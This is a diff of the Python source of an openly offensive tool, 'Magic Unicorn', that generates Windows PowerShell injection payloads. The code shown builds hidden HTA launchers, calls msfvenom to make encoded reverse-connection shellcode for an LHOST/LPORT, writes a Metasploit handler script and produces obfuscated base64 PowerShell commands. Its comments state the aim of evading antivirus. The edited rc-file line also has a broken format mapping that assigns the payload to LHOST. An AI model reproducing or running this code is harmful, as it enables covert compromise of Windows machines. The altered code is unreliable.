@@ -195,7 +195,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.5 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.5.1 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -285,16 +285,12 @@ def generate_macro(full_attack, line_length=380):
 
     # obfsucate the hell out of Shell and PowerShell
     long_string = scramble_stuff().split(",")
-    
     # full powershell.exe
     ps_long = long_string[0]
-
     # ps abbreviated
     ps_short = long_string[1][1:]
-
     # wscript
     wscript = long_string[2]
-
     #shell
     shell = long_string[3]
 
@@ -348,7 +344,7 @@ def gen_cert_attack(filename):
 
 def gen_hta_attack(command):
     # HTA code here
-    main1 = """<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % command
+    main1 = """<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c {0}', 0);window.close();\n</script>""".format(command)
     main2 = """<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>"""
 
     # make a directory if its not there
@@ -371,12 +367,10 @@ def generate_shellcode(payload, ipaddr, port):
 
     # if we are using traditional payloads and not download_eec
     if not "exe=" in ipaddr:
-       ipaddr = "LHOST=%s" % (ipaddr)
-       port = "LPORT=%s" % (port)
+       ipaddr = "LHOST={0}".format(ipaddr)
+       port = "LPORT={0}".format(port)
 
-    proc = subprocess.Popen(
-        "msfvenom -p %s %s %s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (
-            payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c".format(payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '',
@@ -415,9 +409,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     shellcode = newdata[:-1]
 
     # write out rc file
-    write_file("unicorn.rc",
-               "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n" % (
-                   payload, ipaddr, port))
+    write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
 
     # added random vars before and after to change strings - AV you are seriously ridiculous.
     var1 = generate_random_string(3, 4)
@@ -460,7 +452,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
     #"sv x -;sv y ec;sv Z ((gv x).value.toString()+(gv y).value.toString());powershell (gv Z).value.toString()"
-    full_attack = 'powershell -w 1 -C "sv %s -;sv %s ec;sv %s ((gv %s).value.toString()+(gv %s).value.toString());powershell (gv %s).value.toString() \'' % (ran1, ran2, ran3, ran1, ran2, ran3) + \
+    full_attack = 'powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() \''.format(ran1, ran2, ran3, ran1, ran2, ran3) + \
         base64.b64encode(powershell_code.encode('utf_16_le')) + '\'"'
 
     if attack_type == "msf":
